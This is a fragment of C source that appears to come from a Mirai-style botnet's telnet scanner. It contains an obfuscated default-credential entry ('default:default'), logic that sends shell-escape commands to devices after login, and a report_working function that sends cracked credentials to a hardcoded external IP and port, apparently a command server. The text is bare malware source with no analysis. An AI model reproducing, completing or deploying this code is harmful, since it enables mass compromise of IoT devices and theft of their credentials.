...
void scanner_init(void)
{
    ...
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x53\x52\x51\x56\x42\x5B\x43", 14); // default:default
                    ...
                    while (TRUE)
                    {
                        ...
                        case SC_WAITING_LINUXSHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                ...
                                table_unlock_val(TABLE_SCAN_LINUXSHELL);
                                tmp_str = table_retrieve_val(TABLE_SCAN_LINUXSHELL, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_LINUXSHELL);
                        ...
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                ...
                                const char *shellpr = "terminal";

                                send(conn->fd, shellpr, strlen(shellpr), MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
...
static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    ...
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(23,254,231,85);
    addr.sin_port = htons(17164);
